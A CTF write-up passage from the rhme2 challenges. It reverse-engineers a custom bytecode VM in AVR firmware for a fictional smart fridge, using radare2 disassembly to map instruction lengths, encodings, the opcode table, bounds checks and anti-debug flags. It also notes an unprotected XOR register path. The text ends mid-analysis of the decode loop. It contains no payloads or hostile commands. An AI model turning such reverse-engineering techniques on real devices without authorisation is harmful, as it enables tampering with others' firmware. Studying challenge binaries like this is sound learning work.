# Owning the fridge (as a software guy)

Three challanges among the many funny ones in #rhme2 really stand out for their uniqueness, and all of them are linked for being run on a fictional (but not too much) "smart" fridge:

- FridgeJIT
- Hide & Seek
- The Weird Machine

This writeup present them in order, because each one's solution builds on the results of the previous one.

The solutions walked through here are based on [radare2](http://rada.re), and on tools built on top of it. Nothing magic or really advanced has been used to perform static analysis, instead i just made sure r2 shown me the correct disassembly, beautiful enough to be read like a book. Here are few settings which may be non-obvious:

- open the file by specifying the format / architecture: `r2 -F avr firmware.bin` or `r2 -a avr firmware.bin` - this is because at the time of the challenge there was a bug in the avr bin format plugin of radare2 which prevented it to automatically detect it (now fixed)
- set the CPU type to something with 16 bits program counter: `e asm.cpu=ATmega1280` - even if this is not theorically correct, it's essential to let r2 compute the branch target addresses correctly (so having the arrows to point to the right place)
- use projects to avoid data loss: `Ps project_name` / `Po project_name`, if you're really paranoid (like me) you can even configure r2 to save the current project each time it shows you the prompt: "e cmd.prompt=Ps \`e prj.name\`" 
- if you are super-paranoid (like me) you can also set the same to `cmd.vprompt` and `cmd.gprompt` to save also in visual mode and graph visual mode (each time you press a visual navigation key, actually - so ...)
- if you are a fan of "analysis by default" (i'm not) you should use `aaaa` here (the number of `a` matters).

## FridgeJIT

From the challange statement, we know we have to break a custom VM in order to solve it. So it's not a mystery what all VMs are composed of, therefore we have a vaguely clear picture of what we're going to search in the provided binary / memdump:

- an instruction set (usually implemented as one function per instruction)
- memory area for VM registers
- memory area for VM memory / stack
- a decoding loop
- a big switch / jump table to decode opcodes to their implementation functions
- bytecode to run

### Finding instruction implementations

By simply reading the disassembly linearly, after the usual setup functions, some input/output related function, and some unspeakably complex function we'll ignore for now, it's easy to spot a group of contiguous functions in wich each one has the same beginning:

```
            0x00000e0c      fc01           movw r30, r24
            0x00000e0e      a5a1           ldd r26, z+37
            0x00000e10      b6a1           ldd r27, z+38
            0x00000e12      848d           ldd r24, z+28
            0x00000e14      958d           ldd r25, z+29
            0x00000e16      a80f           add r26, r24
            0x00000e18      b91f           adc r27, r25
```
then they do "something", and finally they all have a similar epilogue:

```
            0x00000e3e      448f           std z+28, r20
            0x00000e40      558f           std z+29, r21
            0x00000e42      668f           std z+30, r22
            0x00000e44      778f           std z+31, r23
            0x00000e46      0895           ret
```

So it's storing back a value in [z+28...z+31] bytes (note that `z` is the 16 bits input arg passed to the function in [`r24`,`r25`]).

By "zooming out" the above snippet, let's see where the stored-back values come from. It turns out that in the vast majority of those functions, the new value is calculated in this way:

```
; call loc.00000f8e by passing a constant in r24, different for
; each instruction. This function will return a value in r24
            0x00001008      83e0           ldi r24, 0x03
            0x0000100a      0e94c707       call loc.00000f8e
            
; load the current value of [y+28...y+31] (32 bits value which
; spans 4 bytes)
            0x0000100e      4c8d           ldd r20, y+28
            0x00001010      5d8d           ldd r21, y+29
            0x00001012      6e8d           ldd r22, y+30
            0x00001014      7f8d           ldd r23, y+31
            
; add the value returned from loc.00000f8e to the just loaded
; value (r1 is always set to 0, like a software-defined zero register, 
; used here to zero-extend r24 to 32 bits)
            0x00001016      480f           add r20, r24
            0x00001018      511d           adc r21, r1
            0x0000101a      611d           adc r22, r1
            0x0000101c      711d           adc r23, r1
            
; store the value back
            0x0000101e      4c8f           std y+28, r20
            0x00001020      5d8f           std y+29, r21
            0x00001022      6e8f           std y+30, r22
            0x00001024      7f8f           std y+31, r23
            
; restore y, it was used as an alias for the input value of the
; function (also used as z at the beginning of the function)
            0x00001026      df91           pop r29
            0x00001028      cf91           pop r28
            0x0000102a      0895           ret
```

Now's time for some guesswork. Let's ask ourselves some useful question:

1. are these similarly structured functions the instuction implementations?
- making the hypothesis that those actually **are** the instruction implementations, what's that value always updated after an instruction (stored in [arg0+28...arg0+31] as 32 bits value)?
- what's the role of `loc.00000f8e` function, which provides the offset to add?
- how's that value updated when no additions are involved?
- what is the input argument of all this functions?

Thinking in general about architectures (not only VMs), one possible answer to question 2. is **the instruction pointer**.

If that answer is correct, in general how instruction pointer gets updated after executing an instruction? Naive answers might be:

- if it's not a branch, adding the **instruction length** to the existing value
- if it's a branch, the instruction pointer is set directly per the **branch target** (which in turn can be an absolute or relative value)

So assuming the vast majority of instructions in a set aren't branches, the answer to question 3. is `loc.00000f8e` must **fetch the length of an instruction**, given its identifier. It follows that the instruction implementations not calling that function are **branches**, which answers to question 4.

Building on the above reasnoning, the answer to question 5. is the arg0 of all instruction implementations is **the base address of VM registers**.

#### Instruction lengths

By reading at `loc.00000f8e` with radare2 is easy to understand how it works, here's the graph with comments added:

```
                                        ┌─────────────────────┐
                                        │ [0xf8e] ;[ga]       │
                 [r18,r19] will hold    │   loc.00000f8e ();  │
                 a counter, inited to 0 │ ldi r18, 0x00       │
                                        │ ldi r19, 0x00       │
          arg0, passed in r24 is moved  │ mov r20, r24        │
          to [r20,r21] extending it to  │ ldi r21, 0x00       │
          16 bits with a MSB set to 0   └─────────────────────┘
                                            v
                                            │
                                            │
                                            │ .─.
    Here's a loop, where the counter is ┌────────────────────┐
    added to the constant 0x1c4, moved  │  0xf96 ;[gc]       │
    to z, a byte is read at that address│ movw r30, r18      │
    from data memory and the lower 6    │ subi r30, 0x3c     │
    bits are extracted and compared     │ sbci r31, 0xfe     │
    with arg0.                          │ ld r24, z          │
                                        │ mov r22, r24       │
    If it's equal the loop terminates.  │ andi r22, 0x3f     │
                                        │ ldi r23, 0x00      │
                                        │ cp r22, r20        │
                                        │ cpc r23, r21       │
                                        │ brne 0xfb6 ;[gb]   │
                                        └────────────────────┘
                                                │ t
                              ┌─────────────────│ └─────┐
                              │                 │       │
                              │                 │       │
                      ┌────────────────────┐    │ ┌────────────────────┐
 Success termination, │  0xfaa ;[gd]       │    │ │  0xfb6 ;[gb]       │ The counter is            
 the higher 2 bits of │ swap r24           │    │ │ subi r18, 0xff     │ incremented by 1,       
 the loaded value plus│ lsr r24            │    │ │ sbci r19, 0xff     │ and then jump to        
 one are returned in  │ lsr r24            │    │ │ cpi r18, 0x20      │ loop again, until    
 r24.                 │ andi r24, 0x03     │    │ │ cpc r19, r1        │ counter reaches 0x20    
                      │ subi r24, 0xff     │    │ │ brne 0xf96 ;[gc]   │                      
                      │ ret                │    │ └────────────────────┘
                      └────────────────────┘    └───────┘ f
                                                          │
                                                          │
                                                          │
                                                          │
                                                  ┌────────────────────┐
                        Return 0 because counter  │  0xfc0 ;[ge]       │
                           maxed without finding  │ ldi r24, 0x00      │
                          the needed instruction  │ ret                │
                                                  └────────────────────┘
```

Since the length is stored in 2 bits (and summed one to), the possible lengths are in the range [1-4]. Invalid instructions will get a length of 0.

Here's an example of something happening all the way through the challenges code: adding a constant by subtracting its negative value, so in this case `-0xfe3c` is `0x1c4`. Command to get 16-bits absolute value in radare2: `?v 0x10000-0xfe3c`. Not sure if it's the compiler or the programmers having fun of us by expressing constants like this :).

Anyways, we can read the lengts table from the provided memory dump:

```
$ r2 memory.dmp
 -- r2 talks to you. tries to make you feel well.
[0x00000000]> px 0x20@0x1c4
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x000001c4  0041 4243 c4c5 4647 4849 4a4b 4c4d 5213  .ABC..FGHIJKLMR.
0x000001d4  9455 5697 9859 5a5b 5c1f 4e4f 5051 1d1e  .UV..YZ[\.NOPQ..
```

So let's extract the lower 6 bits of each byte, to get the opcode identifiers:

```
[0x00000000]> e io.cache=true
[0x00000000]> woA 0x3f @ 0x1c4!0x20 # and with 0x3f
[0x00000000]> px 0x20 @ 0x1c4
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x000001c4  0001 0203 0405 0607 0809 0a0b 0c0d 1213  ................
0x000001d4  1415 1617 1819 1a1b 1c1f 0e0f 1011 1d1e  ................
[0x00000000]>
```

Let's reopen it (because the above command just modified the file in memory) and extract the corresponding lengths too (higher 2 bits plus one):

```
$ r2 memory.dmp
 -- A git pull a day keeps the segfault away
[0x00000000]> e io.cache=true
[0x00000000]> wor 06 @0x1c4!0x20 # shift right by 6 bits
[0x00000000]> woa 01 @0x1c4!0x20 # add one
[0x00000000]> px 0x20 @ 0x1c4
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x000001c4  0102 0202 0404 0202 0202 0202 0202 0201  ................
0x000001d4  0302 0203 0302 0202 0201 0202 0202 0101  ................
[0x00000000]>
```

Putting things together, we have an instruction length decoder, here presented as a JSON dictionary, keys are opcode identifier and values are the lengths:

```
{
    '0x0': '0x1',
    '0x1': '0x2',
    '0x2': '0x2',
    '0x3': '0x2',
    '0x4': '0x4',
    '0x5': '0x4',
    '0x6': '0x2',
    '0x7': '0x2',
    '0x8': '0x2',
    '0x9': '0x2',
    '0xa': '0x2',
    '0xb': '0x2',
    '0xc': '0x2',
    '0xd': '0x2',
    '0xe': '0x2',
    '0xf': '0x2',
    '0x10': '0x2',
    '0x11': '0x2',
    '0x12': '0x2',
    '0x13': '0x1',
    '0x14': '0x3',
    '0x15': '0x2',
    '0x16': '0x2',
    '0x17': '0x3',
    '0x18': '0x3',
    '0x19': '0x2',
    '0x1a': '0x2',
    '0x1b': '0x2',
    '0x1c': '0x2',
    '0x1d': '0x1',
    '0x1e': '0x1'
}
```

### Decoding instruction arguments

We're almost ready to analyse each instruction implementation and figure out the whole instruction set. Before digging into that it's necessary to understand the general way instruction arguments are decoded.


Each instruction implementation function is responsible for deconding destination register, source register and immediate values as needed. Let's take the ADD implementation as an example:

```
; the register base address is moved in y
            0x00001164      cf93           push r28
            0x00001166      df93           push r29
            0x00001168      ec01           movw r28, r24
            
; a value is read in z from [register_base+37, register_base+38]
; interesting! but what's that mysterious value? let's see...
            0x0000116a      eda1           ldd r30, y+37
            0x0000116c      fea1           ldd r31, y+38
            
; the instruction pointer is loaded in [r24,r25]
            0x0000116e      8c8d           ldd r24, y+28
            0x00001170      9d8d           ldd r25, y+29
            
; the instruction pointer is summed to z
            0x00001172      e80f           add r30, r24
            0x00001174      f91f           adc r31, r25
            
; one byte is read from address with value z+1 which is
; (instruction_pointer + mysterious_value + 1)...
; oh wait! so mysterious_value must be the bytecode base address!
; therefore z+1 might be second byte of our instruction
            0x00001176      8181           ldd r24, z+1
            
; the lower 3 bits of the higher nibble of the byte are
; extracted into r25, so it's a value in range [0-7]
; a perfect candidate to be the index of a register! let's see...
            0x00001178      982f           mov r25, r24
            0x0000117a      9295           swap r25
            0x0000117c      9770           andi r25, 0x07
            
; our register index in multiplied by 4 (wow! 32 bits registers)
; and added to the register base, so that our z points to a register
            0x0000117e      fe01           movw r30, r28
            0x00001180      24e0           ldi r18, 0x04
            0x00001182      929f           mul r25, r18
            0x00001184      e00d           add r30, r0
            0x00001186      f11d           adc r31, r1
            
; r1 is cleared again, because it's our soft-zero register but also
; the higher part of mul result (pretty funny, honestly)
            0x00001188      1124           clr r1
            
; here instead the lower nibble is extracted, another register index
; notice that here the range of the index is [0-15]
; our x points to another register
            0x0000118a      8f70           andi r24, 0x0f
            0x0000118c      de01           movw r26, r28
            0x0000118e      94e0           ldi r25, 0x04
            0x00001190      899f           mul r24, r25
            0x00001192      a00d           add r26, r0
            0x00001194      b11d           adc r27, r1
            0x00001196      1124           clr r1
            
; register value from z, is loaded into [r20...r23]
            0x00001198      4081           ld r20, z
            0x0000119a      5181           ldd r21, z+1
            0x0000119c      6281           ldd r22, z+2
            0x0000119e      7381           ldd r23, z+3
            
; register value from x is loaded in [r24...r27]
            0x000011a0      8d91           ld r24, x+
            0x000011a2      9d91           ld r25, x+
            0x000011a4      0d90           ld r0, x+
            0x000011a6      bc91           ld r27, x
            0x000011a8      a02d           mov r26, r0
            
; the two 32 bits values are added
            0x000011aa      840f           add r24, r20
            0x000011ac      951f           adc r25, r21
            0x000011ae      a61f           adc r26, r22
            0x000011b0      b71f           adc r27, r23
            
; the result is stored back to the register pointed by z
            0x000011b2      8083           std z+0, r24
            0x000011b4      9183           std z+1, r25
            0x000011b6      a283           std z+2, r26
            0x000011b8      b383           std z+3, r27
            
; here begins the common epilogue...
            0x000011ba      88e0           ldi r24, 0x08
            0x000011bc      0e94c707       call loc.00000f8e
```

Let's recap what we know now about instruction decoding:

- the opcode is the first byte
- the registers are encoded in the second byte
	- destination register is in the higher nibble
	- source register is in the lower nibble
- many instructions, like the ADD shown above, limit the width of the destination register to 3 bits, thus "protecting" the higher half of the registers from overwriting. The funny thing is not all instructions have this protection in place, specifically the XOR
- there is a "special" 16 bits register holding the base address of the bytecode, at offsets [register\_base+37, register\_base+38]

The one of the ADD is only one of several encoding schemes, and namely is the one used on all instructions of type `OP reg, reg`. Here are all possible schemes:

| Type            | Byte0        | Byte1       | Byte2 | Byte3 | Example
|-----------------|--------------|-------------|-------|-------|--------
| OP reg, reg     | opcode       | [Rd, Rs]    | -     | -     | ADD
| OP reg          | opcode       | [Rds, 0]    | -     | -     | PUSH
| OP imm          | opcode       | IMMhi       | IMMlo | -     | JMP 
| OP reg, imm     | opcode       | [Rd, 0]     | IMMhi | IMMlo | MOVH
| OP              | opcode       | -           | -     | -     | RET, NOP

Where:

- `Rd` is the destination register index (most of the times limited to range [0-7])
- `Rs` is the source register index in the range [0-15]
- `IMMhi` and `IMMlo` are the high and the low part of the immediate value respectively
- `-` means the byte is unused, that's why the instructions have different lengths

### The instruction set

TLDR, here's a table of all the instructions in the set, with their length and address of corresponding function in the binary:

| Instruction     | Opcode | Length | Address
|-----------------|--------|--------|--------
| NOP             | 0x00   | 1      | - (in the loop)
| PUSH src        | 0x01   | 2      | 0x193a
| POP dst         | 0x02   | 2      | 0x19d2
| MOV dst, src    | 0x03   | 2      | 0x0fc4
| MOVL dst, imm   | 0x04   | 4      | 0x102c
| MOVH dst, imm   | 0x05   | 4      | 0x10c0
| LOAD dst, src   | 0x06   | 2      | 0x1a84
| STORE dst, src  | 0x07   | 2      | 0x1b1e
| ADD dst, src    | 0x08   | 2      | 0x1164
| SUB dst, src    | 0x09   | 2      | 0x11de
| XOR dst, src    | 0x0a   | 2      | 0x1264
| AND dst, src    | 0x0b   | 2      | 0x12de
| OR dst, src     | 0x0c   | 2      | 0x1358
| INV dst         | 0x0d   | 2      | 0x13d2
| LSL dst, src    | 0x0e   | 2      | 0x1432
| LSR dst, src    | 0x0f   | 2      | 0x14b0
| ROL dst, src    | 0x10   | 2      | 0x152e
| ROR dst, src    | 0x11   | 2      | 0x15e0
| CALL reg        | 0x12   | 2      | 0x1bb8
| RET             | 0x13   | 1      | 0xe7e
| JMP imm         | 0x14   | 3      | 0xe0c
| JMP reg         | 0x15   | 2      | 0xe48
| CMP reg, reg    | 0x16   | 2      | 0x1692
| JZ imm          | 0x17   | 3      | 0x1724
| JNZ imm         | 0x18   | 3      | 0x175e
| JZ reg          | 0x19   | 2      | 0x1798
| JNZ reg         | 0x1a   | 2      | 0x17d2
| IN reg          | 0x1b   | 2      | 0x180c
| OUT reg         | 0x1c   | 2      | 0x187c
| DFAIL           | 0x1d   | 1      | 0x18ca
| TFAIL           | 0x1e   | 1      | 0x1906
| HLT             | 0x1f   | 1      | -

I won't go in much detail for each single instruction, instead i'll focus on generic features.

#### LOAD / STORE instructions

The first thing the LOAD instruction does, is to check the source register (the one containing the address) for being less than `0x101`, otherwise it will fail. Here is a part of its graph:

```
                    Check the address to load from  │ ld r20, z                │
                    to be less than 0x101           │ ldd r21, z+1             │
                    and implicitly positive         │ ldd r22, z+2             │
                                                    │ ldd r23, z+3             │
                                                    │ cpi r20, 0x01            │
                                                    │ ldi r25, 0x01            │
                                                    │ cpc r21, r25             │
                                                    │ cpc r22, r1              │
                                                    │ cpc r23, r1              │
                                                    │ brcc 0x1b06 ;[ga]        │
                                                    └──────────────────────────┘
                                                            f t
                            ┌───────────────────────────────┘ └───────────┐
  ok the check passed, let's│                                             │ it's greater than or equal to 0x101,
  proceed with loading      │                                             │ fail
                    ┌────────────────────────────────────────┐      ┌───────────────────────────────────────────────┐
                    │  0x1abc ;[ge]                          │      │  0x1b06 ;[ga]                                 │
The value at        │ ldd r18, y+33                          │      │ ldi r24, 0x67  ; psz@0x367 -> Oops!           │
[y+33,y+34] is      │ ldd r19, y+34                          │      │ ldi r25, 0x03                                 │
added to the        │ movw r30, r18                          │      │ call fcn.print_cstring ;[gf]                  │
specified address.  │ add r30, r20                           │      │ call fcn.pause_press_enter_to_continue ;[gg]  │
                    │ adc r31, r21                           │      │ ldd r24, y+32                                 │
The resulting       │ ld r20, z                              │      │ ori r24, 0x08                                 │
address is the      │ ldd r21, z+1                           │      │ std y+32, r24                                 │
actual one used     │ ldd r22, z+2                           │      └───────────────────────────────────────────────┘
for loading a 32-   │ ldd r23, z+3                           │          v
bits value, then    │ swap r24                               │          │
stored into         │ andi r24, 0x07                         │          │
destination         │ movw r30, r28                          │          │
register            │ ldi r18, 0x04                          │          │
                    │ mul r24, r18                           │          │
                    │ add r30, r0                            │          │
                    │ adc r31, r1                            │          │
                    . ...                                    .          .
                    .                                        .          .
``` 
This means the vm addresses are expressed as an offset from a "base segment" register, a special register located at `[register_base+33, register_base+34]` and the memory space width is limited to `0x100` bytes. Analogous behavior can be found in the STORE instruction too.

Worths noting that when the bound checking fails, a special "failure" flag is set, namely the 4th bit in the special "flags" byte register located at `[register_base+32]`:

```
        │   0x00001bac      88a1           ldd r24, y+32
        │   0x00001bae      8860           ori r24, 0x08
        │   0x00001bb0      88a3           std y+32, r24
```

This flag will tell the main decoding loop to stop there, as we'll see later.

#### The stack

PUSH and POP instructions work in the same way as LOAD and STORE, in that bound checking is exaclty the same, but this time what's checked is the value of the stack pointer, a register living at `[register_base+24...register_base+27]`. Here is an extract of the PUSH implementation:

```
                  The stack pointer is loaded,   │ ldd r24, y+24                │
                  then then subtracted by 4.     │ ldd r25, y+25                │
                                                 │ ldd r26, y+26                │
                                                 │ ldd r27, y+27                │
                                                 │ sbiw r24, 0x04               │
                                                 │ sbc r26, r1                  │
                                                 │ sbc r27, r1                  │
                  At this point is checked to be │ cpi r24, 0x01                │
                  less than 0x101 (and positive) │ ldi r19, 0x01                │
                                                 │ cpc r25, r19                 │
                                                 │ cpc r26, r1                  │
                                                 │ cpc r27, r1                  │
                                                 │ brcc 0x19ba ;[ga]            │
                                                 └──────────────────────────────┘
                                                         f t
                           ┌─────────────────────────────┘ └─────────────┐ greater than or equal 0x101, fail
                           │                                             │
                           │                                             │
                   ┌────────────────────────────────────────┐      ┌───────────────────────────────────────────────┐
Storing back the   │  0x1968 ;[ge]                          │      │  0x19ba ;[ga]                                 │
updated stack      │ std y+24, r24                          │      │ ldi r24, 0x77                                 │
pointer.           │ std y+25, r25                          │      │ ldi r25, 0x03                                 │
                   │ std y+26, r26                          │      │ call fcn.print_cstring ;[gf]                  │
                   │ std y+27, r27                          │      │ call fcn.pause_press_enter_to_continue ;[gg]  │
                   │ swap r18                               │      │ ldd r24, y+32                                 │
Get the value to   │ andi r18, 0x0f                         │      │ ori r24, 0x08                                 │
push from the      │ movw r30, r28                          │      │ std y+32, r24                                 │
register argument. │ ldi r19, 0x04                          │      └───────────────────────────────────────────────┘
                   │ mul r18, r19                           │          v
                   │ add r30, r0                            │          │
                   │ adc r31, r1                            │          │
                   │ clr r1                                 │          │
                   │ ld r20, z                              │          │
                   │ ldd r21, z+1                           │          │
                   │ ldd r22, z+2                           │          │
                   │ ldd r23, z+3                           │          │
Sum the stack      │ ldd r18, y+33                          │          │
pointer to the     │ ldd r19, y+34                          │          │
base segment addr  │ movw r30, r18                          │          │
                   │ add r30, r24                           │          │
                   │ adc r31, r25                           │          │
Store the value    │ std z+0, r20                           │          │
on the stack       │ std z+1, r21                           │          │
                   │ std z+2, r22                           │          │
                   │ std z+3, r23                           │          │
                   . ...                                    .          .
                   .                                        .          .
```

#### Comparisons, flags and conditionals

TLDR; the flags are stored in the lower 4 bits of the special byte register located at `[register_base+32]`, these are the meanings:

| bit 3    | bit 2    | bit 1     | bit 0       |
|----------|----------|-----------|-------------|
| FAIL     | DEBUG    | -         | ZERO (EQUAL)|

The CMP instruction compares for equality (it isn't a difference) and then sets the corresponding flag (first bit) in the flags byte register:

```
 r25 is set to one, then         │ ldi r25, 0x01           │
 the input registers' values     │ ld r16, x+              │
 are compared.                   │ ld r17, x+              │
                                 │ ld r18, x+              │
                                 │ ld r19, x               │
                                 │ ld r20, z               │
                                 │ ldd r21, z+1            │
                                 │ ldd r22, z+2            │
                                 │ ldd r23, z+3            │
                                 │ cp r16, r20             │
                                 │ cpc r17, r21            │
                                 │ cpc r18, r22            │
                                 │ cpc r19, r23            │
                                 │ breq 0x16f4 ;[ga]       │
                                 └─────────────────────────┘
                                         f t
                                   ┌─────┘ └───────────┐
                                   │                   │
                                   │                   │
 If values aren't equal,   ┌────────────────────┐      │
 r25 is set to 0           │  0x16f2 ;[gc]      │      │
                           │ ldi r25, 0x00      │      │
                           └────────────────────┘      │
                               v                       │
                             ┌─┘   ┌───────────────────┘
                             │     │
                             │     │
                         ┌────────────────────────────────────────┐
                         │  0x16f4 ;[ga]                          │
 r24 = current flags val │ ldd r24, y+32                          │
 bit 0 is set as the     │ bst r25, 0                             │
 same bit in r25         │ bld r24, 0                             │
 and stored back in      │ std y+32, r24                          │
 flags register          . ...                                    .
                         .                                        .
```

This equality flag (bit 0), is checked by conditional branch instructions, for example here is JNZ (branch if bit 0 is clear):

```
                                    │ push r28                    │
                                    │ push r29                    │
                                    │ movw r30, r24               │
                                    │ ldd r18, z+32               │
         Is flags' bit 0 cleared?   │ sbrc r18, 0 ;[gb]           │
                                    └─────────────────────────────┘
                                            f t
                  ┌─────────────────────────┘ └─────────────────────────────┐
 Not cleared,     │                                                         │ Take the branch!
 do nothing!      │                                                         │
          ┌────────────────────┐                                      ┌────────────────────┐
          │  0x17dc ;[ge]      │                                      │  0x17de ;[gb]      │
          │ rjmp 0x17e6 ;[gd]  │                                      │ pop r29            │
          └────────────────────┘                                      │ pop r28            │
              v                                                       │ jmp 0xe48 ;[ga]    │
              │                                                       └────────────────────┘
              .                                                           v
              .                                           ┌───────────────┘
                                                          │
                                                          │
                                                      ┌─────────────────────────────────────────────────────┐
                                                      │  0xe48 ;[ga]                                        │
                                                      │      ; JMP XREF from 0x000017e2 (fcn.instr_JNZ_reg) │
                                                      │ movw r30, r24                                       │
                                 Get the jump target  │ ldd r26, z+37                                       │
                                 from the register    │ ldd r27, z+38                                       │
                                 argument.            │ ldd r24, z+28                                       │
                                                      │ ldd r25, z+29                                       │
                                                      │ add r26, r24                                        │
                                                      │ adc r27, r25                                        │
                                                      │ adiw r26, 0x01                                      │
                                                      │ ld r24, x                                           │
                                                      │ swap r24                                            │
                                                      │ andi r24, 0x0f                                      │
                                                      │ movw r26, r30                                       │
                                                      │ ldi r25, 0x04                                       │
                                                      │ mul r24, r25                                        │
                                                      │ add r26, r0                                         │
                                                      │ adc r27, r1                                         │
                                                      │ clr r1                                              │
                                                      │ ld r24, x+                                          │
                                                      │ ld r25, x+                                          │
                                                      │ ld r0, x+                                           │
                                                      │ ld r27, x                                           │
                                                      │ mov r26, r0                                         │
                                 Store it to the      │ std z+28, r24                                       │
                                 instruction pointer  │ std z+29, r25                                       │
                                                      │ std z+30, r26                                       │
                                                      │ std z+31, r27                                       │
```

The DFAIL instruction takes whatever value from the third bit of the flags register, flips it and store it back on the flags bit 0 (the comparison result flag):

```
│           0x000018d0      98a1           ldd r25, y+32
│           0x000018d2      92fb           bst r25, 2
│           0x000018d4      2227           clr r18
│           0x000018d6      20f9           bld r18, 0
│           0x000018d8      81e0           ldi r24, 0x01
│           0x000018da      8227           eor r24, r18
│           0x000018dc      80fb           bst r24, 0
│           0x000018de      90f9           bld r25, 0
│           0x000018e0      98a3           std y+32, r25
```

The TFAIL instruction cause the VM to stop (by setting the fourth bit of the flags) if the third bit of the flags is set:

```
 r25 = current flags         │ ldd r25, y+32            │
                             │ sbrs r25, 2 ;[ga]        │
                             └──────────────────────────┘
                                     f t
                          ┌──────────┘ └────────────┐
                          │                         │ third bit is set, fail
                          │                         │
                  ┌────────────────────┐      ┌────────────────────┐
 Third bit is not │  0x1910 ;[gd]      │      │  0x1912 ;[ga]      │
 set, do nothing  │ rjmp 0x1916 ;[gc]  │      │ ori r25, 0x08      │
                  └────────────────────┘      │ std y+32, r25      │
                      v                       └────────────────────┘
                      │                           v
```

Ok, but how the third bit of flags is set? And what does it mean? Apparently it's set when in the embedded VM-debugging console, the user starts debugging, with `[d]ebug` command:

```
; length of comparison
            0x00000d30      42e0           ldi r20, 0x02
            0x00000d32      50e0           ldi r21, 0x00

; pointer (in data memory) to the string to compare with
; in this case can be read from memory dump: psz @ 0x261 -> 'd'
            0x00000d34      61e6           ldi r22, 0x61
            0x00000d36      72e0           ldi r23, 0x02
            
; address of the input string
            0x00000d38      c701           movw r24, r14
            0x00000d3a      0e943e11       call fcn.strncmp            ;[1]
            0x00000d3e      892b           or r24, r25
        ┌─< 0x00000d40      29f4           brne 0xd4c                  ;[2]
; strings are equal, raise the third bit
        │   0x00000d42      f801           movw r30, r16
        │   0x00000d44      80a1           ldd r24, z+32
        │   0x00000d46      8460           ori r24, 0x04
        │   0x00000d48      80a3           std z+32, r24
```

So the meaning of that flag is "we're being debugged". The meaning of the DFAIL instruction is to check if debugger is present, while TFAIL causes termination if debugger is present.

#### Input / output

In order to print things and ask for user input, the virtual machine has two specific instructions.

IN, reads a byte from the serial port - here's its core:

```
; read one byte from serial, and get it in r24
│           0x00001834      0e940102       call fcn.read_char          ;[1]

; store it in the destination register,
; zero-extending it to 32 bits
│           0x00001838      cc0f           lsl r28
│           0x0000183a      dd1f           rol r29
│           0x0000183c      cc0f           lsl r28
│           0x0000183e      dd1f           rol r29
│           0x00001840      c00f           add r28, r16
│           0x00001842      d11f           adc r29, r17
│           0x00001844      90e0           ldi r25, 0x00
│           0x00001846      a0e0           ldi r26, 0x00
│           0x00001848      b0e0           ldi r27, 0x00
│           0x0000184a      8883           std y+0, r24
│           0x0000184c      9983           std y+1, r25
│           0x0000184e      aa83           std y+2, r26
│           0x00001850      bb83           std y+3, r27
```

OUT, writes a byte to the serial port:

```
; load one byte from source register
│           0x0000188e      8181           ldd r24, z+1
│           0x00001890      8295           swap r24
│           0x00001892      8f70           andi r24, 0x0f
│           0x00001894      fe01           movw r30, r28
│           0x00001896      94e0           ldi r25, 0x04
│           0x00001898      899f           mul r24, r25
│           0x0000189a      e00d           add r30, r0
│           0x0000189c      f11d           adc r31, r1
│           0x0000189e      1124           clr r1
│           0x000018a0      8081           ld r24, z

; send it to the serial output
│           0x000018a2      0e94df01       call print_char
```

#### The decoding loop

The execution of the VM bytecode occour in a loop, but also can happen via the VM-debugger's `[c]ontinue` command. Both ways end up calling the decoding function at `0x00001cd4`, which worths to be analysed in detail. Here's the annotated graph:

```
                            Clear the FAIL flag │ ldd r24, y+32          │
                                                │ andi r24, 0xf7         │
                                                │ std y+32, r24          │
                            Load the first byte │ ldd r12, y+28          │
                            of the next instr,  │ ldd r13, y+29          │
                            at bytecode_base +  │ ldd r14, y+30          │
                            instruction_pointer │ ldd r15, y+31          │
                                                │ ldd r30, y+37          │
                                                │ ldd r31, y+38          │
                                                │ add r30, r12           │
                                                │ adc r31, r13           │
                            zero extend the byte│ ld r20, z              │
                            to [r20...r23]      │ ldi r21, 0x00          │
                            that's our opcode   │ ldi r22, 0x00          │
                                                │ ldi r23, 0x00          │
                                                │ cp r20, r1             │
                                                │ cpc r21, r1            │
                                                │ cpc r22, r1            │
                                                │ cpc r23, r1            │
                            is it != 0 ?        │ brne 0x1d26 ;[ga]      │
                                                └────────────────────────┘
                                                        f t
                       ┌────────────────────────────────┘ └──────────────────────┐
                       │                                                         │
                       │                                                         │
Opcode is 0,   ┌────────────────────────────────────────┐                  ┌────────────────────┐ Opcode is != 0,
this is the NOP│  0x1d0e ;[ge]                          │                  │  0x1d26 ;[ga]      │ is the opcode 
implementation │ ldi r24, 0x00                          │                  │ cpi r20, 0x1f      │ equal to 0x1f ?
               │ call fcn.get_instruction_length ;[gb]  │                  │ cpc r21, r1        │
               │ add r12, r24                           │                  │ cpc r22, r1        │
               │ adc r13, r1                            │                  │ cpc r23, r1        │
               │ adc r14, r1                            │                  │ breq 0x1d82 ;[gd]  │
               │ adc r15, r1                            │                  └────────────────────┘
               │ std y+28, r12                          │                          f t
               │ std y+29, r13                          │                          │ │
               │ std y+30, r14                          │                          │ │
               │ std y+31, r15                          │                          │ │
               │ rjmp 0x1d7e ;[gc]                      │           ┌──────────────┘ └───────────┐
               └────────────────────────────────────────┘           │                            │
                   v                                                │ Opcode > 0 and             │ Opcode 0x1f is HLT,
                   └────────────────┐                               │ != 0x1f, i.e. the          │ returning 1 will cause
                                    │                               │ real instructions          │ the VM to stop execution
                                    │                               │                            │
                                    │                       ┌────────────────────┐         ┌────────────────────┐
                                    │  Init a 16-bits       │  0x1d30 ;[gg]      │         │  0x1d82 ;[gf]      │
                                    │  counter to 0         │ ldi r24, 0x00      │         │ ldi r24, 0x01      │
                                    │                       │ ldi r25, 0x00      │         └────────────────────┘
                                    │                       └────────────────────┘             v
                                    │                           v                              │
                                    │                           │                              └──────┐
                                    │                           │                                     │
                                    │                           │ .─.                                 │
                                    │                       ┌────────────────────┐                    │
                                    │                       │  0x1d34 ;[gi]      │                    │
                                    │  Multiply the counter │ movw r30, r24      │                    │
                                    │  by 3, we're going to │ lsl r30            │                    │
                                    │  index an array with  │ rol r31            │                    │
                                    │  elements 3 bytes long│ add r30, r24       │                    │
                                    │                       │ adc r31, r25       │                    │
                                    │  Add 0x16a to the     │ subi r30, 0x96     │                    │
                                    │  counter, and load 1  │ sbci r31, 0xfe     │                    │
                                    │  byte.                │ ld r16, z          │                    │
